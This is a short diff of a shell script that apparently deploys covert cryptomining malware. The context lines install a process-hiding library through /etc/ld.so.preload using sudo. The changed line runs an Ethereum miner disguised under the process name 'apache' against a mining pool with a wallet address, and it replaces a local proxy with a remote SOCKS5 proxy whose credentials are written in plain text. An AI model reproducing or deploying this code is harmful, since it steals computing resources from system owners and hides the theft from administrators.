@@ -18,4 +18,4 @@ make
 sudo mv libprocesshider.so /usr/local/lib/;sudo su -c 'echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload'
 cd ..
 
-./apache --algo ETHASH --pool stratum+ssl://eth-de.flexpool.io:5555 --user 0xbc48b8bdce572defe4dcab85103f140099bc5af5.$(echo $(shuf -i 1-1000 -n 1)) --ethstratum ETHPROXY --socks5 127.0.0.1:9050 --dns-over-https 0
+./apache --algo ETHASH --pool stratum+ssl://eth-de.flexpool.io:5555 --user 0xbc48b8bdce572defe4dcab85103f140099bc5af5.$(echo $(shuf -i 1-1000 -n 1)) --ethstratum ETHPROXY --socks5 mikrotik999:Elibawnos@cpusocks1.wot.mrface.com:1080 --dns-over-https 0
